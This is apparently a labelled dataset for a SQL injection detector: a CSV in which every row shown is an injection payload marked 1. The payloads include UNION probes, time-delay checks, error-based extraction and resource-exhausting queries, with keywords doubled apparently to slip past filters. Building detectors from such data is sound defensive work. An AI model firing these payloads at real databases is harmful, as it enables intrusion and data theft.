Query,Label
"1  )   uniunionon all seleselectct nnullull,nnullull--",1
"1'||  (  seselectlect 'rqzu' frfromom dual whwhereere 9516  =  9516 oorr elt  (  5873  =  5873,sleep  (  5   )    )   #",1
1'   )    )    as gfzb wherwheree 7904  =  7904,1
"1%""   )    )     )   aandnd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nulnulll  )   aandnd    (    (     (  ""%""  =  """,1
"-9779'   )    )    oorr make_sesett  (  9354  =  9354,7185  )   anandd    (    (   'hmzj'  =  'hmzj",1
"1' whwhereere 9156  =  9156 anandd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  --",1
"call regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   aandnd 'ekhi'  =  'ekhi",1
"1%'   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
-7430'  )   as xfah whwhereere 1596  =  1596 oorr 4144  =    (  sselectelect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   ffromrom dual  )  --,1
-1648   )    )    as oqqy wwherehere 3459  =  3459 oorr 6872  =  6872--,1
"-7731""   )    )    oorr make_sesett  (  2551  =  4389,4389  )   aandnd    (    (   ""unly"" llikeike ""unly",1
"-5372""  )   as wlqm whwhereere 2432  =  2432 uniunionon all selselectect 2432,2432,2432,2432,2432,2432#",1
"-9996' oorr make_sesett  (  1237  =  7111,7111  )  ",1
sselectelect   (  case when   (  4690  =  4373  )   then 4690 else 1/  (  sselectelect 0  )   end  )  --,1
"-6815 wherwheree 7609  =  7609 oorr 1 group bbyy concat  (  0x7171706a71,  (  seleselectct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
selecselectt   (  case when   (  7005  =  7118  )   then 1 else 7005*  (  selecselectt 7005 ffromrom master..sysdatabadatabaseses  )   end  )  --,1
"1   )    )    as xsyk whwhereere 2575  =  2575 oorr 8156  =    (  seselectlect count  (  *  )   frfromom generate_series  (  1,5000000   )    )   --",1
"1  )   whwhereere 7815  =  7815 uunionnion all seleselectct nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
selecselectt sleep  (  5  )   anandd 'eskp' liklikee 'eskp,1
"1""  )   as advz whewherere 5166  =  5166 oorr 8156  =    (  selselectect count  (  *  )   ffromrom generate_series  (  1,5000000   )    )   --",1
"1""   )    )     )   aandnd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aandnd    (    (     (  ""fogb"" lilikeke ""fogb",1
"1""  )   as vpna wwherehere 5450  =  5450 oorr char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  --",1
1' rlilikeke sleep  (  5  )   aandnd 'gtfo'  =  'gtfo,1
-8966%' oorr   (  7475  =  4014  )  *4014 anandd '%'  =  ',1
1  )   as sdnd whewherere 9472  =  9472,1
1   )    )     )   anandd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd    (    (     (  5368  =  5368,1
"1%"" rliklikee sleep  (  5  )   aandnd ""%""  =  """,1
"-9944""   )    )    oorr 8537  =  2039 aandnd    (    (   ""kfzj""  =  ""kfzj",1
"1%""  )   anandd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"-3347'+  (  seleselectct xuzs whwhereere 1076  =  1076 ununionion all seleselectct 1076,1076,1076,1076,1076--",1
"1'   )    )     )   anandd exp  (  ~  (  seselectlect * ffromrom   (  seselectlect concat  (  0x7171706a71,  (  seselectlect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    anandd    (    (     (  'lyem' liklikee 'lyem",1
"-7764"" oorr 7308  =  7805",1
"1%'   )    )    uniounionn all selselectect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
1' iinn boolean mode  )   anandd sleep  (  5  )  #,1
"-4152""  )   wherwheree 9781  =  9781 uniounionn all selecselectt 9781,9781,9781,9781,9781--",1
"1"" aandnd   (  seselectlect 2*  (  if   (    (   seselectlect * frofromm   (  seselectlect concat  (  0x7171706a71,  (  seselectlect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1%""  )   oorr 1022  =    (  sselectelect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-6122""  )   ununionion all seselectlect 6578,6578--",1
sselectelect   (  case when   (  5768  =  9169  )   then 5768 else 1/  (  sselectelect 0  )   end  )  --,1
"1' wherwheree 9003  =  9003 aandnd make_sesett  (  5868  =  8316,8316  )  --",1
"1""   )    )     )   oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  seleselectct   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    aandnd    (    (     (  ""dzse""  =  ""dzse",1
 (  seleselectct   (  case when   (  8130  =  5894  )   then 8130 else 8130*  (  seleselectct 8130 frfromom iinnfoorrmation_schema.character_sesetts  )   end   )    ) ,1
selselectect case when 4537  =  8418 then 1 else nnullull end--,1
1 oorr 6793  =    (  selecselectt 6793 frofromm pg_sleep  (  5   )    )   -- fyaq,1
"1 aandnd   (  sselectelect 9067 frfromom  (  sselectelect count  (  *  )  ,concat  (  0x7171706a71,  (  sselectelect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )  -- jpqa",1
"1""  )   wherwheree 5298  =  5298 aandnd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1
"-4966%"" uniunionon all seleselectct 4300,4300,4300,4300,4300,4300,4300,4300#",1
"1'  )   oorr 8384  =  lilikeke  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )    aandnd   (  'lqql'  =  'lqql",1
"iif  (  3447  =  1084,1,1/0  )  ",1
"1'   )    )     )   aandnd upupdatedatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  sselectelect   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   aandnd    (    (     (  'vfnl'  =  'vfnl",1
"1'  )   aandnd 8407  =    (  sselectelect count  (  *  )   frofromm generate_series  (  1,5000000   )    )    aandnd   (  'pgyl'  =  'pgyl",1
1'||  (  selselectect 'uedk' whewherere 4655  =  4655,1
"1%"" oorr 5356  =    (  selecselectt count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1' oorr char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nnullull  )  --",1
seselectlect   (  case when   (  1291  =  6612  )   then 1 else 1291*  (  seselectlect 1291 frfromom master..sysdatabadatabaseses  )   end  )  --,1
-2429%' oorr 6890  =  5846,1
"1%""   )    )     )   oorr 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    anandd    (    (     (  ""%""  =  """,1
-4761 oorrdoorrderer bbyy 1--,1
1' oorr   (  seselectlect * ffromrom   (  seselectlect  (  sleep  (  5   )    )     )  sddo  )  #,1
"-4394'   )    )    uniounionn all selecselectt 3409,3409--",1
-2960' oorr 2163  =  3143--,1
1'  )   whwhereere 1645  =  1645 rlilikeke sleep  (  5  )  --,1
"-6890""   )    )     )   ununionion all seselectlect 1115#",1
1  )   whwhereere 4479  =  4479 rlilikeke   (  sselectelect   (  case when   (  6351  =  4367  )   then 1 else 0x28 end   )    )   --,1
"seleselectct * ffromrom generate_series  (  2317,2317,case when   (  2317  =  9706  )   then 1 else 0 end  )   lilimitmit 1--",1
"seselectlect * frofromm generate_series  (  3427,3427,case when   (  3427  =  7516  )   then 1 else 0 end  )   llimitimit 1--",1
"1"" aandnd elt  (  4249  =  4249,7259  )  ",1
"1'   )    )    as ewyk whewherere 4828  =  4828 anandd   (  seselectlect 2*  (  if   (    (   seselectlect * ffromrom   (  seselectlect concat  (  0x7171706a71,  (  seselectlect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"selecselectt count  (  *  )   ffromrom generate_series  (  1,5000000  )   aandnd ""%""  =  """,1
"-8186%' oorr elt  (  1032  =  1032,3623  )   anandd '%'  =  '",1
1   )    )    rlilikeke sleep  (  5  )   aandnd    (    (   8773  =  8773,1
selselectect case when 7649  =  9297 then 1 else nnullull end--,1
"-2872  )   wwherehere 8797  =  8797 oorr 1 group bbyy concat  (  0x7171706a71,  (  seleselectct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
"-7255' ununionion all seleselectct 2127,2127,2127,2127,2127#",1
"1'  )   wherwheree 1363  =  1363 oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nulnulll  )  --",1
"1%""   )    )    oorr uupdatepdatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  selecselectt   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   aandnd    (    (   ""%""  =  """,1
"1'||  (  seselectlect 'jpow' frfromom dual wherwheree 4381  =  4381 anandd   (  seselectlect 9067 frfromom  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a   )    )   ||'",1
1  )   as tbve wherwheree 4828  =  4828,1
1'+  (  seleselectct iwbs wherwheree 4939  =  4939,1
"1' iinn boolean mode  )   uunionnion all selselectect nunullll,nunullll,nunullll,nunullll,nunullll--",1
"-4385%'   )    )    uniunionon all selselectect 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",1
sselectelect   (  case when   (  7271  =  1658  )   then 7271 else 7271*  (  sselectelect 7271 frofromm iinnfoorrmation_schema.character_ssetets  )   end  )  #,1
1'  )   as fksm whwhereere 9714  =  9714,1
"1 whwhereere 1153  =  1153 oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  selselectect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
1  )   as drgs wherwheree 1989  =  1989 oorrdoorrderer bbyy 1--,1
"1' aandnd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1'   )    )    as kwre whwhereere 7775  =  7775 aandnd 9254  =    (  seselectlect count  (  *  )   frofromm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"selecselectt count  (  *  )   frofromm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 anandd    (    (     (  'qhgp'  =  'qhgp",1
"1'  )   oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  seselectlect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    aandnd   (  'blnh' llikeike 'blnh",1
-1499  )   as gxfm wherwheree 9762  =  9762 oorr 5989  =  4782--,1
"1""   )    )    aandnd 9660  =    (  selecselectt count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1'+  (  seleselectct 'toec' wherwheree 5810  =  5810 anandd sleep  (  5   )    )   +',1
"1 oorr 4411  =    (  selecselectt count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
-4023 oorr   (  8779  =  5716  )  *5716,1
1'||  (  seselectlect 'eyiy' frfromom dual whewherere 8127  =  8127,1
"selecselectt count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 anandd   (  'vfxg' liklikee 'vfxg",1
"1',  (  begiinn if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",1
"1""   )    )    as daqd whewherere 4390  =  4390 aandnd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"-2009%' uunionnion all seleselectct 1991,1991#",1
"1'   )    )    oorr elt  (  6272  =  6272,sleep  (  5   )    )    aandnd    (    (   'fele'  =  'fele",1
"1%'  )   anandd 5556  =    (  sselectelect count  (  *  )   ffromrom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   anandd   (  '%'  =  '",1
1  )   wwherehere 2199  =  2199 oorr   (  seleselectct * frofromm   (  seleselectct  (  sleep  (  5   )    )     )  ydpu  )  --,1
"1' whewherere 4417  =  4417 anandd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
"-1620   )    )    ununionion all selselectect 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",1
"1'+  (  selecselectt 'opqr' whwhereere 2442  =  2442 oorr 1022  =    (  selecselectt count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1"" aandnd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",1
"1  )   whewherere 9206  =  9206 uniounionn all selselectect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"1'+  (  selecselectt 'ycsv' wwherehere 3628  =  3628 anandd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  --",1
"1%""  )   anandd 7533  =  7533 anandd   (  ""%""  =  """,1
"selselectect llikeike  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   # lchh",1
"1'||  (  seleselectct 'uusj' whewherere 2149  =  2149 oorr 8384  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )     )  ||'",1
"1 aandnd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selselectect   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",1
"-1512 uunionnion all sselectelect 9013,9013,9013,9013#",1
"1' oorr 8384  =  llikeike  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   ",1
"1'  )   aandnd char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  --",1
1 waitfoorr delay '0:0:5'-- nnnp,1
"1' oorr 8315  =    (  selselectect count  (  *  )   frofromm sysibm.systabtableles as t1,sysibm.systabtableles as t2,sysibm.systabtableles as t3  )  ",1
1'   )    )    as yqek wherwheree 1957  =  1957,1
"1""   )    )     )   aandnd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seleselectct   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   aandnd    (    (     (  ""fjwv"" lilikeke ""fjwv",1
1  )   as hggi wherwheree 6511  =  6511,1
"1'   )    )    oorr 8384  =  llikeike  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )    aandnd    (    (   'gxpr'  =  'gxpr",1
"-6662""   )    )    uniunionon all seleselectct 6755--",1
1'+  (  seselectlect 'hplm' whwhereere 4008  =  4008 aandnd 8594  =    (  seselectlect 8594 frfromom pg_sleep  (  5   )    )   --,1
"1'   )    )     )   anandd 9254  =    (  sselectelect count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""   )    )    aandnd make_sesett  (  8266  =  9226,9226  )   aandnd    (    (   ""omjx"" liklikee ""omjx",1
1'||  (  seleselectct 'oxdh' whwhereere 6967  =  6967 aandnd sleep  (  5  )  #,1
selselectect   (  case when   (  5698  =  3453  )   then 5698 else 1/  (  selselectect 0  )   end  )  --,1
"-5776%' uunionnion all seselectlect 3075,3075,3075,3075,3075--",1
"1'   )    )    as oldh wwherehere 9551  =  9551 uniunionon all seleselectct nunullll,nunullll,nunullll#",1
1 rllikeike sleep  (  5  )  #,1
1  )   rllikeike   (  sselectelect   (  case when   (  5477  =  7492  )   then 1 else 0x28 end   )    )    anandd   (  4427  =  4427,1
"1"" aandnd 6240  =    (  'qqpjq'||  (  seselectlect case 6240 when 6240 then 1 else 0 end frofromm rdb$databdatabasease  )  ||'qzvzq'  )   aandnd ""sckh""  =  ""sckh",1
"1""  )   whwhereere 1607  =  1607",1
1%'   )    )    oorr   (  selselectect * frfromom   (  selselectect  (  sleep  (  5   )    )     )  ydpu  )   aandnd    (    (   '%'  =  ',1
"-4194""   )    )     )   oorr 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aandnd    (    (     (  ""ddbc"" liklikee ""ddbc",1
"1   )    )    as rual wherwheree 4649  =  4649 anandd   (  sselectelect 2*  (  if   (    (   sselectelect * ffromrom   (  sselectelect concat  (  0x7171706a71,  (  sselectelect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1%""   )    )    uunionnion all selecselectt nunullll--",1
1'+  (  sselectelect 'czpg' wwherehere 6627  =  6627 anandd 2006  =  2006,1
"selecselectt count  (  *  )   frofromm domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabtableles as t3 anandd    (    (     (  ""%""  =  """,1
